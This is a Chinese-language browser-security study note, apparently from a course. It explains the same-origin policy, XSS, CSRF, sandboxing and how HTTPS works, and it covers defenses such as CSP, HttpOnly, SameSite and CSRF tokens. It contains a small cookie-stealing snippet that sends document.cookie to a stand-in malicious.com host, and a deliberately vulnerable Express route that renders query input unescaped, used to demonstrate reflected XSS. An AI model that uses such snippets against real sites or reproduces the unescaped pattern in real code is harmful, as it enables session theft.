[toc]

## 总览

**浏览器安全**可分为：

* **Web 页面安全**：同源策略、XSS 攻击、CSRF 攻击
* **浏览器网络安全**：HTTPS
* **浏览器系统安全**：安全沙箱

**在没有安全保障的 Web 世界中，我们是没有隐私的，因此需要安全策略来保障我们的隐私和数据的安全。**

## 同源策略：为什么 XMLHttpRequest 不能跨域请求资源

### 基础概念

> 如果两个 URL 的**协议、域名和端口**都相同，我们就称这两个 URL **同源**。
>
> 浏览器默认两个相同的源之间是可以相互访问资源和操作 DOM 的。两个不同的源之间若想要相互访问资源或者操作 DOM，那么会有一套基础的安全策略的制约，我们把这称为**同源策略**。
>
> 同源策略会隔离不同源的 DOM、页面数据和网络通信，进而实现 Web 页面的安全性。

同源策略具体主要表现在 Dom、Web 数据和网络这三个层面。

**第一个，DOM 层面。**同源策略限制了来自不同源的 JavaScript 脚本对当前 DOM 对象读和写的操作。

比如：从极客时间官网打开任意一个专栏，然后在控制台输入：

```javascript
{
    //对象 opener 就是指向第一个页面的 window 对象，我们可以通过操作 opener 来控制第一个页面中的 DOM。
    let pdom = opener.document 
    pdom.body.style.display = "none"
}
```

第一个页面将被隐藏，因为两者同源。如果从极客时间打开比如 InfoQ 的页面，因为两者不同源，在 InfoQ 的页面访问极客时间页面的 DOM 是，页面抛出异常，这就是同源策略发挥的作用。

```javascript
Blocked a frame with origin "https://www.infoq.cn" from accessing a cross-origin frame.
```

**第二个，数据层面。**同源策略限制了不同源的站点读取当前站点的 Cookie、IndexDB、LocalStorage 等数据。

**第三个，网络层面。**同源策略限制了通过 XMLHttpRequest 等方式将站点的数据发送给不同源的站点。

### 同源策略的安全和便利性的权衡

安全性和便利性是相互对立的，让不同的源之间绝对隔离，无疑是最安全的措施，但这也会使得 Web 项目难以开发和使用。因此我们就要在这之间做出权衡，出**让一些安全性**来满足灵活性；而出让安全性又带来了很多安全问题，最典型的是 XSS 攻击和 CSRF 攻击。

**同源策略出让的安全性**

#### 1. 页面可以嵌入第三方资源

Web 世界是开放的，可以接入任何资源，而同源策略要让一个页面的所有资源都来自于同一个源（即将该页面的所有资源都部署在同一台服务器上），这违背了 Web 的初衷，也带来了诸多限制。

所以最初的浏览器都是支持外部引用资源文件的，不过这也带来了很多问题。

最多的一个问题是浏览器的首页内容会被一些恶意程序劫持，其中最常见的是恶意程序通过各种途径往 HTML 文件中插入恶意脚本。

比如：恶意程序在 HTML 文件中插入如下 JavaScript 代码：

![img](https://static001.geekbang.org/resource/image/74/de/741dc2c53217aee177d18375a7aa94de.png)

浏览器是无法区分被插入的文件是恶意的还是正常的，当页面启动时，它可以修改用户的搜索结果、改变一些内容的连接指向，等等。

除此之外，它还能将页面的敏感数据，如Cookie、IndexDB、LoacalStorage 等数据通过 XSS 的手段发送给服务器。如下面这段伪代码：

```javascript
function onClick(){
  let url = `http://malicious.com?cookie = ${document.cookie}`
  open(url)
}
onClick()
```

在这段代码中，恶意脚本读取 Cookie 数据，并将其作为参数添加至恶意站点尾部，当打开该恶意页面时，恶意服务器就能接收到当前用户的 Cookie 信息。

以上就是一个非常典型的 **XSS 攻击**。为了解决 XSS 攻击，浏览器中引入了内容安全策略，称为 CSP。**CSP 的核心思想是让服务器决定浏览器能够加载哪些资源，让服务器决定浏览器是否能够执行内联 JavaScript 代码。**通过这些手段就可以大大减少 XSS 攻击。

#### 2. 跨域资源共享和跨文档消息机制

**跨域资源共享（CORS）**：使用该机制可以进行跨域访问控制，从而使跨域数据传输得以安全进行。比如可以在极客官网通过 XMLHttpRequest 请求 InfoQ 中的资源。

**跨文档消息机制**：如果两个页面不同源，则无法相互操作 DOM。但在实际应用中，经常需要两个不同源的 DOM 之间进行通信，于是引入了该机制。可以通过 window.postMessage 的 JavaScript 接口来和不同源的 DOM 进行通信。

### 总结

同源策略会隔离不同源的 DOM、页面数据和网络通信，进而实现 Web 页面的安全性。

不过鱼和熊掌不可兼得，要绝对的安全就要牺牲掉便利性，因此我们要在这二者之间做权衡，找到中间的一个平衡点，也就是目前的页面安全策略原型。总结起来，它具备以下三个特点：

1. 页面中可以引用第三方资源，不过这也暴露了很多诸如 XSS 的安全问题，因此又在这种开放的基础之上引入了 CSP 来限制其自由程度。
2. 使用 XMLHttpRequest 和 Fetch 都是无法直接进行跨域请求的，因此浏览器又在这种严格策略的基础之上引入了跨域资源共享策略，让其可以安全地进行跨域操作。
3. 两个不同源的 DOM 是不能相互操纵的，因此，浏览器中又实现了跨文档消息机制，让其可以比较安全地通信。



## 跨站脚本攻击（XSS）：为什么 Cookie 中有 HttpOnly 属性？

同源策略为了协调安全性和便捷性，需要在两者间寻找一个平衡点，所以默认页面中可以引用任意第三方资源，然后又引入 CSP 策略来加以限制；默认 XMLHttpRequest 和 Fetch 不能跨站请求资源，然后又通过 CORS 策略来支持其跨域。

不过支持页面中的第三方资源引用和 CORS 也带来了很多安全问题，其中最典型的就是 **XSS 攻击。**

### 什么是 XSS攻击

XSS 全称 Cross Site Scripting，即“跨站脚本”。XSS 攻击是指黑客往 HTML 文件中或者 DOM 中注入恶意脚本，从而在用户浏览页面时利用注入的恶意脚本对用户实施攻击的一种手段。

当页面被注入了恶意 JavaScript 脚本时，浏览器无法区分这些脚本是被恶意注入的还是正常的页面内容，所以恶意注入 JavaScript 脚本也拥有所有的脚本权限。

恶意脚本能做的事：

* **窃取 Cookie 信息**：恶意 JavaScript 可以通过“document.cookie”获取 Cookie 信息，然后通过 XMLHttpRequest 或者 Fetch 加上 CORS 功能将数据发送给恶意服务器；恶意服务器拿到用户的 Cookie 信息之后，就可以在其他电脑上模拟用户的登录，然后进行转账等操作。
* **监听用户行为**：恶意 JavaScript 可以使用“addEventListener”接口来监听键盘事件，比如可以获取用户输入的信用卡等信息，将其发送到恶意服务器。黑客掌握了这些信息之后，又可以做很多违法的事情。
* 通过**修改 DOM **伪造假的登录窗口，用来欺骗用户输入用户名和密码等信息。
* **在页面内生成浮窗广告**，这些广告会严重地影响用户体验。
* ……

### 恶意脚本是怎么注入的

通常情况下，主要有**存储型 XSS 攻击、反射型 XSS 攻击**和**基于 DOM 的 XSS 攻击**三种方式来注入恶意脚本。

#### 1. 存储型 XSS 攻击

大致步骤：

* 首先黑客利用站点漏洞将一段恶意 JavaScript 代码提交到网站的数据库中；
* 然后用户向网站请求包含了恶意 JavaScript 脚本的页面；
* 当用户浏览该页面的时候，恶意脚本就会将用户的 Cookie 信息等数据上传到服务器。

典型案例：15年喜马拉雅就被曝出了存储型 XSS 漏洞。

#### 2. 反射型 XSS 攻击

在一个反射型 XSS 攻击过程中，恶意 JavaScript 脚本属于用户发送给网站请求中的一部分，随后网站又把恶意 JavaScript 脚本返回给用户。当恶意 JavaScript 脚本在用户页面中被执行时，黑客就可以利用该脚本做一些恶意操作。

一个用 Node 演示的简单的例子：

```js
var express = require('express');
var router = express.Router();

router.get('/', function(req, res, next) {
  res.render('index', { title: 'Express',xss:req.query.xss });
});

module.exports = router;
```

```html
<!DOCTYPE html>
<html>
<head>
  <title><%= title %></title>
  <link rel='stylesheet' href='/stylesheets/style.css' />
</head>
<body>
  <h1><%= title %></h1>
  <p>Welcome to <%= title %></p>
  <div>
      <%- xss %>
  </div>
</body>
</html>
```

当我们打开 `http://localhost:3000/?xss=<script>alert('你被xss攻击了')</script>` 这段URL时，结果显示如下：

![img](https://static001.geekbang.org/resource/image/4d/fa/4dff7d83fe2eecc6cb52c126b4f650fa.png)

用户将一段含有恶意代码的请求提交给 Web 服务器，Web 服务器接收到请求时，又将恶意代码反射给了浏览器端，这就是反射型 XSS 攻击。在现实生活中，黑客经常会通过 QQ 群或者邮件等渠道诱导用户去点击这些恶意链接，所以对于一些链接我们一定要慎之又慎。

另外需要注意的是，**Web 服务器不会存储反射型 XSS 攻击的恶意脚本，这是和存储型 XSS 攻击不同的地方。**

#### 3. 基于DOM 的 XSS 攻击

基于 DOM 的 XSS 攻击是不牵涉到页面 Web 服务器的。具体来讲，黑客通过各种手段将恶意脚本注入用户的页面中，比如通过网络劫持在页面传输过程中修改 HTML 页面的内容，这种劫持类型很多，有通过 WiFi 路由器劫持的，有通过本地恶意软件来劫持的，它们的共同点是在 Web 资源传输过程或者在用户使用页面的过程中修改 Web 页面的数据。

### 如何阻止 XSS 攻击

我们知道存储型 XSS 攻击和反射型 XSS 攻击都是需要经过 Web 服务器来处理的，因此可以认为这两种类型的漏洞是**服务端的安全漏洞**。而基于 DOM 的 XSS 攻击全部都是在浏览器端完成的，因此基于 DOM 的 XSS 攻击是属于**前端的安全漏洞**。

但无论是何种类型的 XSS 攻击，它们都有一个共同点，那就是首先往浏览器中注入恶意脚本，然后再通过恶意脚本将用户信息发送至黑客部署的恶意服务器上。

所以要阻止 XSS 攻击，我们可以通过阻止恶意 JavaScript 脚本的注入和恶意消息的发送来实现。

#### 1. 服务器对输入脚本进行过滤或转码

不管是反射型还是存储型 XSS 攻击，我们都可以在服务器端将一些关键的字符进行转码，比如：

```javascript
code:<script>alert('你被xss攻击了')</script>
//1.过滤
code:
//2.转码
code:&lt;script&gt;alert(&#39;你被xss攻击了&#39;)&lt;/script&gt;
```

这样处理后，即使这段脚本返回给页面，页面也不会执行这段脚本。

#### 2. 充分利用 CSP

虽然在服务器端执行过滤或者转码可以阻止 XSS 攻击的发生，但完全依靠服务器端依然是不够的，我们还需要把 CSP 等策略充分地利用起来，以降低 XSS 攻击带来的风险和后果。

实施严格的 CSP 可以有效地防范 XSS 攻击，具体来讲 **CSP 有如下几个功能**：

- 限制加载其他域下的资源文件，这样即使黑客插入了一个 JavaScript 文件，这个 JavaScript 文件也是无法被加载的；
- 禁止向第三方域提交数据，这样用户数据也不会外泄；
- 禁止执行内联脚本和未授权的脚本；
- 还提供了上报机制，这样可以帮助我们尽快发现有哪些 XSS 攻击，以便尽快修复问题。

因此，利用好 CSP 能够有效降低 XSS 攻击的概率。

**启用 CSP 的方法**

* 通过 HTTP 头信息的 `Content-Security-Policy`字段
* 通过网页的`<meta>`标签

#### 3. 使用 HttpOnly 属性

由于很多 XSS 攻击都是来盗用 Cookie 的，因此还可以通过使用 HttpOnly 属性来保护我们 Cookie 的安全。

通常服务器可以**将某些 Cookie 设置为 HttpOnly 标志**，HttpOnly 是服务器通过 HTTP 响应头来设置的，下面是打开 Google 时，HTTP 响应头中的一段：

```http
set-cookie: NID=189=M8q2FtWbsR8RlcldPVt7qkrqR38LmFY9jUxkKo3-4Bi6Qu_ocNOat7nkYZUTzolHjFnwBw0izgsATSI7TZyiiiaV94qGh-BzEYsNVa7TZmjAYTxYTOM9L_-0CN9ipL6cXi8l6-z41asXtm2uEwcOC5oh9djkffOMhWqQrlnCtOI; expires=Sat, 18-Apr-2020 06:52:22 GMT; path=/; domain=.google.com; HttpOnly
```

我们可以看到，set-cookie 属性值最后使用了 HttpOnly 来标记该 Cookie。顾名思义，使用 HttpOnly 标记的 Cookie 只能使用在 HTTP 请求过程中，所以**无法通过 JavaScript 来读取这段 Cookie。**

由于 JavaScript 无法读取设置了 HttpOnly 的 Cookie 数据，所以即使页面被注入了恶意 JavaScript 脚本，也是无法获取到设置了 HttpOnly 的数据。因此一些比较重要的数据我们建议设置 HttpOnly 标志。

当然除了以上策略之外，我们还可以通过**添加验证码**防止脚本冒充用户提交危险操作。而对于一些不受信任的输入，还可以**限制其输入长度**，这样可以增大 XSS 攻击的难度。



## CSRF 攻击

### 什么是 CSRF 攻击

CSRF 全称 Cross-site request forgery，又称“跨站请求伪造”，是指黑客引诱用户打开黑客的网站，在黑客的网站中，利用用户的登陆状态发起的跨站请求。简单说，**CSRF 攻击就是黑客利用了用户的登录状态，并通过第三方的站点来做一些坏事。**

**三种实施 CSRF 攻击的方式：**

* 自动发起 Get 请求
* 自动发起 POST 请求
* 引诱用户点击链接

**和 XSS 不同的是，CSRF 攻击不需要将恶意代码注入用户的页面，仅仅是利用服务器的漏洞和用户的登录状态来实施攻击。**

### 如何防止 CSRF 攻击

发起 CSRF 攻击的三个必要条件：

* 目标站点一定要有 CSRF 漏洞
* 用户要登录过目标站点，并且在浏览器上保持有该站点的登录状态
* 需要用户打开一个第三方站点，可以是黑客的站点，也可以是一些论坛。

与 XSS 攻击不同，CSRF 攻击不会往页面注入恶意脚本，因此黑客是无法通过 CSRF 攻击来获取用户页面数据的；其最关键的一点是要能找到服务器的漏洞，所以说对于 CSRF 攻击我们主要的防护手段是提升服务器的安全性。

要让服务器免遭 CSRF 攻击，有以下几种途径。

#### 1. 充分利用好 Cookie 的 SameSite 属性

黑客会利用用户的登录状态来发起 CSRF 攻击，而 **Cookie 正是浏览器和服务器之间维护登录状态的一个关键数据**，因此要阻止 CSRF 攻击，我们首先就要考虑在 Cookie 上来做文章。

通常 CSRF 攻击都是从第三方站点发起的，要防止 CSRF 攻击，我们最好能实现从第三方站点发送请求时**禁止 Cookie 的发送**，因此在浏览器通过不同来源发送 HTTP 请求时，有如下区别：

* 如果是从第三方站点发起的请求，那么需要浏览器禁止发送某些关键 Cookie 数据到服务器；
* 如果是同一个站点发起的请求，那么就需要保证 Cookie 数据正常发送。

Cookie 中的 **SameSite 属性**正是为了解决这个问题的，通过使用 SameSite 可以有效地降低 CSRF 攻击的风险。

在 HTTP 响应头中，通过 set-cookie 字段设置 Cookie 时，可以带上 SameSite 选项，如下：

```http
set-cookie: 1P_JAR=2019-10-20-06; expires=Tue, 19-Nov-2019 06:36:21 GMT; path=/; domain=.google.com; SameSite=none
```

**SameSite 选项通常有 Strict、Lax 和 None 三个值。**

* Strict 最为严格。如果 SameSite 的值是 Strict，那么浏览器会完全禁止第三方 Cookie。
* Lax 相对宽松一点。在跨站点的情况下，从第三方站点的链接打开和从第三方站点提交 Get 方式的表单这两种方式都会携带 Cookie
* 而如果使用 None 的话，在任何情况下都会发送 Cookie 数据。

#### 2. 验证请求的来源站点

由于 CSRF 攻击大多来自于第三方站点，因此服务器可以禁止来自第三方站点的请求。

通过 HTTP 请求头中的 Referer 和 Origin 属性，能够判断请求是否来自第三方站点。

**Referer 是 HTTP 请求头中的一个字段，记录了该 HTTP 请求的来源地址**。但某些场合并不合适将来源 URL 暴露给服务器，所有浏览器提供给开发者一个选项，可以不用上传 Referer 值，具体可参考 Referrer Policy。

但在服务器端验证请求头中的 Referer 并不是太可靠，因此标准委员会又制定了 **Origin 属性**，在一些重要的场合，比如通过 XMLHttpRequest、Fecth 发起跨站请求或者通过 Post 方法发送请求时，都会带上 Origin 属性。

Origin 属性只包含了域名信息，并没有包含具体的 URL 路径，这是 Origin 和 Referer 的一个主要区别。在这里需要补充一点，Origin 的值之所以不包含详细路径信息，是有些站点因为安全考虑，不想把源站点的详细路径暴露给服务器。

因此，服务器的策略是优先判断 Origin，如果请求头中没有包含 Origin 属性，再根据实际情况判断是否使用 Referer 值。

#### 3. CSRF Token

**流程**

**第一步，**在浏览器向服务器发起请求时，服务器生成一个 CSRF Token。CSRF Token 其实就是服务器生成的字符串，然后将该字符串植入到返回的页面中。

```HTML
<!DOCTYPE html>
<html>
<body>
    <form action="https://time.geekbang.org/sendcoin" method="POST">
      <input type="hidden" name="csrf-token" value="nc98P987bcpncYhoadjoiydc9ajDlcn"> //注意这里
      <input type="text" name="user">
      <input type="text" name="number">
      <input type="submit">
    </form>
</body>
</html>
```

**第二步，**在浏览器端如果要发起转账的请求，那么需要带上页面中的 CSRF Token，然后服务器会验证该 Token 是否合法。如果是从第三方站点发出的请求，那么将无法获取到 CSRF Token 的值，所以即使发出了请求，服务器也会因为 CSRF Token 不正确而拒绝请求。



## 安全沙箱：页面和系统之间的隔离墙

本文主要讲的是**浏览器架构如何影响到操作系统安全的**。

通过浏览器漏洞进行的攻击是可以入侵到浏览器进程内部的，可以读取和修改浏览器进程内部的任意内容，还可以穿透浏览器，在用户的操作系统上悄悄地安装恶意软件、监听用户键盘输入信息以及读取用户硬盘上的文件内容。

### 安全视角下的多进程架构

![img](https://static001.geekbang.org/resource/image/b8/b1/b83693a1ace43f43f9cab242982de6b1.png)

现代浏览器采用了多进程架构，浏览器被划分为**浏览器内核**和**渲染内核**两个核心模块。其中浏览器内核是由网络进程、浏览器主进程和 GPU 进程组成的，渲染内核就是渲染进程。那如果我们在浏览器中打开一个页面，这两个模块是怎么配合的呢？

所有的网络资源都是通过浏览器内核来下载的，下载后的资源会通过 IPC 将其提交给渲染进程（浏览器内核和渲染进程之间都是通过 IPC 来通信的）。然后渲染进程会对这些资源进行解析、绘制等操作，最终生成一幅图片。但是渲染进程并不负责将图片显示到界面上，而是将最终生成的图片提交给浏览器内核模块，由浏览器内核模块负责显示这张图片。

疑惑：

- 为什么一定要通过浏览器内核去请求资源，再将数据转发给渲染进程，而不直接从进程内部去请求网络资源？
- 为什么渲染进程只负责生成页面图片，生成图片还要经过 IPC 通知浏览器内核模块，然后让浏览器内核去负责展示图片？

### 安全沙箱

由于渲染进程需要执行 DOM 解析、CSS 解析、网络图片解码等操作，如果渲染进程中存在系统级别的漏洞，那么以上操作就有可能让恶意的站点获取到渲染进程的控制权限，进而又获取操作系统的控制权限，这对于用户来说是非常危险的。

因为网络资源的内容存在着各种可能性，所以浏览器会默认所有的网络资源都是不可信的，都是不安全的。

下载了一个恶意程序，没有执行它，恶意程序是不会生效的。同理，浏览器可以安全地下载各种网络资源，但是如果要执行这些网络资源，比如解析 HTML等操作，就需要非常谨慎了，因为一不小心，黑客就会利用这些操作对含有漏洞的浏览器发起攻击。

基于以上原因，我们需要在渲染进程和操作系统之间建一道墙，即便渲染进程由于存在漏洞被黑客攻击，但由于这道墙，黑客就获取不到渲染进程之外的任何操作权限。**将渲染进程和操作系统隔离的这道墙就是我们要聊的安全沙箱。**

浏览器中的安全沙箱是利用操作系统提供的安全技术，让渲染进程在执行过程中无法访问或者修改操作系统中的数据，在渲染进程需要访问系统资源的时候，需要通过浏览器内核来实现，然后将访问的结果通过 IPC 转发给渲染进程。

安全沙箱最小的保护单位是进程。因为单进程浏览器需要频繁访问或者修改操作系统的数据，所以单进程浏览器是无法被安全沙箱保护的，而现代浏览器采用的多进程架构使得安全沙箱可以发挥作用。

安全沙箱是不能防止 XSS 或者 CSRF 一类的攻击，安全沙箱的目的是隔离渲染进程和操作系统，让渲染进行没有访问操作系统的权利。XSS 或者 CSRF 主要是利用网络资源获取用户的信息，这和操作系统没有关系的。

### 安全沙箱如何影响各个模块功能

安全沙箱最小的保护单位是进程，并且能限制进程对操作系统资源的访问和修改，这就意味着如果要让安全沙箱应用在某个进程上，那么这个进程必须没有读写操作系统的功能，比如读写本地文件、发起网络请求、调用 GPU 接口等。

渲染进程和浏览器内核各自都有哪些职责：

![img](https://static001.geekbang.org/resource/image/f8/1b/f8cc6394832ed238f18a01eff5726f1b.png)

由于渲染进程需要安全沙箱的保护，因此需要把在渲染进程内部涉及到和系统交互的功能都转移到浏览器内核中去实现。

那么安全沙箱如何影响到各个模块功能的呢？

1. **持久存储**
2. **网络访问**
3. **用户交互**

**站点隔离（Site Isolation)**

所谓站点隔离是指 Chrome 将同一站点（包含了相同根域名和相同协议的地址）中相互关联的页面放到同一个渲染进程中执行。

由于最初都是按照标签页来划分渲染进程的，所以如果一个标签页里面有多个不同源的 iframe，那么这些 iframe 也会被分配到同一个渲染进程中，这样就很容易让黑客通过 iframe 来攻击当前渲染进程。而站点隔离会将不同源的 iframe 分配到不同的渲染进程中，这样即使黑客攻击恶意 iframe 的渲染进程，也不会影响到其他渲染进程的。



## HTTPS：让数据传输更安全

当初设计 HTTP 协议的目的就是为了传输超文本文件，当时没有太强的加密传输的数据需求，所以 HTTP 一直保持着明文传输数据的特征。但这样的话，在传输过程中的每一个环节，数据都有可能被窃取或者篡改，这也意味着你和服务器之间还可能有个中间人，你们在通信过程中的一切内容都在中间人的掌握中。使用HTTP传输的内容很容易被中间人窃取、伪造和篡改，通常我们把这种攻击方式称为**中间人攻击**。

具体来讲，在将 HTTP 数据提交给 TCP 层之后，数据会经过用户电脑、WiFi 路由器、运营商和目标服务器，在这中间的每个环节中，数据都有可能被窃取或篡改。比如用户电脑被黑客安装了恶意软件，那么恶意软件就能抓取和篡改所发出的 HTTP 请求的内容。或者用户一不小心连接上了 WiFi 钓鱼路由器，那么数据也都能被黑客抓取或篡改。

### 在 HTTP 协议栈中引入安全层

![img](https://static001.geekbang.org/resource/image/9e/cf/9e99f797de30a15a11b0e4b4c8f810cf.png)

通常 HTTP 直接和 TCP 通信，HTTPS 则先和安全层通信，然后安全层再和 TCP 层通信。也就是说 HTTPS 所有的安全核心都在安全层，它不会影响到上面的 HTTP 协议，也不会影响到下面的 TCP/IP。

安全层的两个主要职责：

* **对发起HTTP请求的数据进行加密操作**
* **对接收到HTTP的内容进行解密操作**

安全层最重要的就是加解密，接下来利用这个安全层，一步一步实现一个HTTP协议。

### 第一版：使用对称加密

**对称加密是指加密和解密都使用的是相同的密钥。**

要在两台电脑上加解密同一个文件，我们至少需要知道加解密方式和密钥，因此，在 HTTPS 发送数据之前，浏览器和服务器之间需要协商加密方式和密钥，过程如下所示：

![img](https://static001.geekbang.org/resource/image/d8/3b/d86648267d5504c7813b2d692620503b.png)

通过上图我们可以看出，HTTPS 首先要**协商加解密方式**，这个过程就是 **HTTPS 建立安全连接**的过程。为了让加密的密钥更加难以破解，我们让服务器和客户端同时决定密钥，具体过程如下：

- 浏览器发送它所支持的加密套件列表和一个随机数 client-random，这里的加密套件是指加密的方法，加密套件列表就是指浏览器能支持多少种加密方法列表。
- 服务器会从加密套件列表中选取一个加密套件，然后还会生成一个随机数 service-random，并将 service-random 和加密套件列表返回给浏览器。
- 最后浏览器和服务器分别返回确认消息。

这样浏览器端和服务器端都有相同的 client-random 和 service-random 了，然后它们再使用相同的方法将 client-random 和 service-random 混合起来生成一个密钥 master secret，有了密钥 master secret 和加密套件之后，双方就可以进行数据的加密传输了。

通过将对称加密应用在安全层上，我们实现了第一个版本的 HTTPS，虽然这个版本能够很好地工作，但是其中传输 client-random 和 service-random 的过程却是**明文**的，这意味着黑客也可以拿到协商的加密套件和双方的随机数，由于利用随机数合成密钥的算法是公开的，所以黑客拿到随机数之后，也可以合成密钥，这样数据依然可以被破解，那么黑客也就可以使用密钥来伪造或篡改数据了。

### 第二版：使用非对称加密

**非对称加密算法有 A、B 两把密钥，如果你用 A 密钥来加密，那么只能使用 B 密钥来解密；反过来，如果你要 B 密钥来加密，那么只能用 A 密钥来解密。**

在 HTTPS 中，服务器会将其中的一个密钥通过明文的形式发送给浏览器，我们把这个密钥称为**公钥**，服务器自己留下的那个密钥称为**私钥**。顾名思义，**公钥是每个人都能获取到的，而私钥只有服务器才能知道，不对任何人公开**。下图是使用非对称加密改造的 HTTPS 协议：

![img](https://static001.geekbang.org/resource/image/b2/50/b2b893921491c62b29aaddc1d4fa9550.png)

非对称加密的请求流程：

- 首先浏览器还是发送加密套件列表给服务器。
- 然后服务器会选择一个加密套件，不过和对称加密不同的是，使用非对称加密时服务器上需要有用于浏览器加密的公钥和服务器解密 HTTP 数据的私钥，由于公钥是给浏览器加密使用的，因此服务器会将加密套件和公钥一道发送给浏览器。
- 最后就是浏览器和服务器返回确认消息。

这样浏览器端就有了服务器的公钥，在浏览器端向服务器端发送数据时，就可以使用该公钥来加密数据。由于公钥加密的数据只有私钥才能解密，所以即便黑客截获了数据和公钥，他也是无法使用公钥来解密数据的。

因此采用非对称加密，就能保证浏览器发送给服务器的数据是安全的了，这看上去似乎很完美，不过这种方式依然存在两个严重的问题。

- **第一个是非对称加密的效率太低。**这会严重影响到加解密数据的速度，进而影响到用户打开页面的速度。
- **第二个是无法保证服务器发送给浏览器的数据安全。**虽然浏览器端可以使用公钥来加密，但是服务器端只能采用私钥来加密，私钥加密只有公钥能解密，但黑客也是可以获取得到公钥的，这样就不能保证服务器端数据的安全了。

常用的非对称加密算法有RSA，对称加密算法有AES

### 第三版：对称加密和非对称加密搭配使用

基于以上两点原因，选择一个更加完美的方案，即：**在传输数据阶段依然使用对称加密，但是对称加密的密钥我们采用非对称加密来传输。**

![img](https://static001.geekbang.org/resource/image/d5/45/d5cd34dbf3636ebc0e809aa424c53845.png)

流程：

- 首先浏览器向服务器发送对称加密套件列表、非对称加密套件列表和随机数 client-random；
- 服务器保存随机数 client-random，选择对称加密和非对称加密的套件，然后生成随机数 service-random，向浏览器发送选择的加密套件、service-random 和公钥；
- 浏览器保存公钥，并生成随机数 pre-master，然后利用公钥对 pre-master 加密，并向服务器发送加密后的数据；
- 最后服务器拿出自己的私钥，解密出 pre-master 数据，并返回确认消息。

到此为止，服务器和浏览器就有了共同的 client-random、service-random 和 pre-master，然后服务器和浏览器会使用这三组随机数生成**对称密钥**，因为服务器和浏览器使用同一套方法来生成密钥，所以最终生成的密钥也是相同的。

有了对称加密的密钥之后，双方就可以使用对称加密的方式来传输数据了。

需要特别注意的一点，**pre-master 是经过公钥加密之后传输的，所以黑客无法获取到 pre-master，这样黑客就无法生成密钥，也就保证了黑客无法破解传输过程中的数据了。**

### 第四版：添加数字证书

使用对称和非对称混合方式完美地实现了数据的加密传输。但这种方式依然存在这问题，比如我要打开极客时间的官网，但是黑客通过 DNS 劫持将极客时间官网的 IP 地址替换成了黑客的 IP 地址，这样我访问的其实是黑客的服务器了，黑客就可以在自己的服务器上实现公钥和私钥，而对浏览器来说，它完全不知道现在访问的是个黑客的站点。

黑客也可以伪造身份发布公钥。如果你拿到了假的公钥，混合加密就完全失效了。你以为自己是在和“某宝”通信，实际上网线的另一端却是黑客，银行卡号、密码等敏感信息就在“安全”的通信过程中被窃取了

> 中间人攻击过程：
>
> 1. 服务器向客户端发送公钥。
> 2. 攻击者截获公钥，保留在自己手上。
> 3. 然后攻击者自己生成一个【伪造的】公钥，发给客户端。
> 4. 客户端收到伪造的公钥后，生成加密hash 值发给服务器。
> 5. 攻击者获得加密hash 值，用自己的私钥解密获得真秘钥。
> 6. 同时生成假的加密hash 值，发给服务器。
> 7. 服务器用私钥解密获得假秘钥。
> 8. 服务器用加秘钥加密传输信息
>
> 防范方法：服务端在发送浏览器的公钥中加入CA 证书，浏览器可以验证CA 证书的有效性

所以我们还需要服务器向浏览器提供证明“我就是我”，那怎么证明呢？

极客时间要证明这个服务器就是极客时间的，需要使用权威机构颁发的证书，这个权威机构称为 **CA（Certificate Authority）**，颁发的证书就称为**数字证书（Digital Certificate)**。

数字证书有两个作用：

* 通过数字证书向浏览器证明服务器的身份
* 数字证书里面包含了服务器公钥。

含有数字证书的HTTPS请求流程：

![img](https://static001.geekbang.org/resource/image/77/af/77c852ff2202b2b7bb3299a96a0f4aaf.png)

相对于第三版的两点改变：

1. 服务器没有直接返回公钥给浏览器，而是返回了数字证书，而公钥正是包含在数字证书中的；
2. 在浏览器端多了一个证书验证的操作，验证了证书之后，才继续后续流程。

通过引入数字证书，我们就实现了服务器的身份认证功能，这样即便黑客伪造了服务器，但是由于证书是没有办法伪造的，所以依然无法欺骗用户。

#### 数字证书的申请和验证

【参考】：https://time.geekbang.org/column/article/156181

**数字证书的验证**

- 浏览器接收到数字证书之后，会对数字证书进行验证。首先浏览器读取证书中相关的明文信息，采用 CA 签名时相同的 Hash 函数来计算并得到**信息摘要 A**；然后再利用对应 CA 的公钥解密签名数据，得到**信息摘要 B**；对比信息摘要 A 和信息摘要 B，如果一致，则可以确认证书是合法的，即证明了这个服务器是极客时间的；同时浏览器还会验证证书相关的域名信息、有效时间等信息。
- 这时候相当于验证了 CA 是谁，但是这个 CA 可能比较小众，浏览器不知道该不该信任它，然后浏览器会继续查找给这个 CA 颁发证书的 CA，再以同样的方式验证它上级 CA 的可靠性。通常情况下，操作系统中会内置信任的顶级 CA 的证书信息（包含公钥），如果这个 CA 链中没有找到浏览器内置的顶级的 CA，证书也会被判定非法。